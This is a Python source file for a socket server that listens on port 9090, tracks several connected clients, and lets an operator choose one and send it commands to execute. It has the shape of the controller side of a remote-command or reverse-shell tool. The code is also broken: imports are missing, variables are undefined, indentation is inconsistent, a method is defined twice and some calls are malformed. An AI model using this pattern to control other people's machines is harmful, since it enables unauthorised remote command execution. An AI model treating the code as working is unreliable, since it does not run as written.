# server

import socket
import sys
import time


class Server(object):

    #Initializing server. Server is listening on port 9090 for connection.
    def __init__(self):
        self.host = '' #This is the localhost
        self.port = 9090 #listening port
        self.socket = None  #initializing socket connection

    #Create a basic server
    def create_server(self):
        #Opens a socket connection for server to listen on
        try:
            self.socket = socket.socket()
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            return True
        #Throw error if failure to create the socket
        except socket.error as e:
            print("failed to create socket" + str(e))
            time.sleep(5)
            self.create_server() #retries to create socket

    #Start the server.
    def start_server(self):
        while 1:
            try:
                conn, address = self.socket.accept() #accepts client connection, client sends over its hostname
                client = conn.recv(1024).decode('utf-8') #recieves the data from client
                add_host = address + (client_hostname,)
                self.clients.append((conn,addr_host)) #client info added to list
            #If the server is unable to connect to the client
            except socket.error as e:
                print("Unable to accept a new connection" + str(e))


     #server asks user for input to enter the next command for the client to execute
     def send_commands(self,client):
        #Sends a join command so that the client returns its current working directory
        cmd = 'join'
        while True:
            client.send(cmd.encode())
            if cmd == 'quit':
                break
            response = str(client.recv(1024),"utf-8")
            print(response, end="") #prints client working directory
            cmd = input()
     #listener
     def start_server(server):
        server.create_server()
        server.start_server()

    #processing code
    def processClient(server):
        while True:
            if not server.clients: #no clients found!
                print('.',end="")
                time.sleep(1)
                sys.stdout.flush()
                continue
            print()
            for i, item in enumerate(server.clients):
                print(i,item[1])
            command = input('choose client: ')
            if command == 'r':
                continue
            client.send_commands[int(cmd)]
            server.send_commands(client[0])

#main activity
def main():
    server = Server()
    listener = threading.Thread(target=start_server, args=(server,))
    listener.daemon = True #When main thread exits, current thread dies
    listener.start()

    workerThread = threading.Thread(target,processClient, args=(server,))
    workerThread.daemon = True
    workerThread.start()

    listener.join()
    workerThread.join()
    server.create_server()
    server.start_server()

print('starting...')
main()
